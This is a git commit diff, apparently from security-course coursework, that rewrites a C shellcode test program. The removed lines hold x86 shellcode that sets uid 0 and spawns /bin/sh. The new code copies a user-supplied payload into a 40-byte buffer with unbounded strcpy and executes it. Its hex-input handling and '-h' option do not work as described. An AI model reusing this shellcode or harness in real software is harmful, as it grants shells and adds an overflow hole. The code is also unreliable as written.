960b3eefd9cb0e6837b18176221966b86d785260
sneakyPent <zaharioudakis@yahoo.com>
2021-01-19 17:06:17 +0200

    update test program to get shellcode as input

--- Assignment_8/src/test.c
+++ Assignment_8/src/test.c
@@ -1,12 +1,49 @@
+#include <getopt.h>
 #include <stdio.h>
 #include <sys/mman.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdlib.h>
 
-int main(int argc, char **argv) {
-  unsigned char code[] = "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
-  
-  int (*foo)() = (int(*)())code;
-  foo();
+void usage(void)
+{
+	printf(
+		"\n"
+		"usage:\n"
+		"\t./test \n"
+		"\nOptions:\n\n"
+		"-p <payload>,\t\t The payload in hex form\n"
+		"-h, \t\t\t Help message\n\n");
+
+	exit(1);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned char payload[40];
+	int ch;
+	if (argc < 2 || argc > 3)
+		usage();
+	while ((ch = getopt(argc, argv, "p:")) != -1)
+	{
+		switch (ch)
+		{
+		case 'p':
+			strcpy(payload,optarg);
+			break;
+		case 'h':
+			break;
+		default:
+			usage();
+		}
+	}
+
+	argc -= optind;
+	argv += optind;
+	
+	int (*foo)() = (int (*)())payload;
+	foo();
+	return 0;
+
 }
